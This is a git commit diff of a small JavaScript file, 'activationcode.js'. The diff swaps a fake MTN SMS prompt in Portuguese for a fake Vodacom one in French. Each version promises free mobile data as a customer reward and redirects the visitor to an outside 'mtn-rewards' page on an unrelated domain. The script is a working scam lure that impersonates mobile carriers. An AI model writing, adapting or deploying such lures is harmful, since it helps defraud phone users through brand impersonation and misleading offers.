3ad25fb5065eb30e9c0acb1a8f720b1f40202c5a
zamonize1 <52072397+zamonize@users.noreply.github.com>
2024-06-05 14:29:37 -0700

    Update activationcode.js

--- activationcode.js
+++ activationcode.js
@@ -1,6 +1,5 @@
-
-var senha = '1'
-password=prompt('MTN SMS: Prezado cliente, por favor, verifique se o seu cartão SIM MTN está qualificado para receber de 5 GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
-if (senha! = '1') {
+var password = '1'
+password=prompt('Vodacom SMS: Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 5 Go à des données illimitées, récompense des anciens clients, appuyez sur 1 pour vérifier maintenant. ','1');
+if (password != '1') {
 location.href='https://todyforu.xyz/mtn-rewards.html';
 }
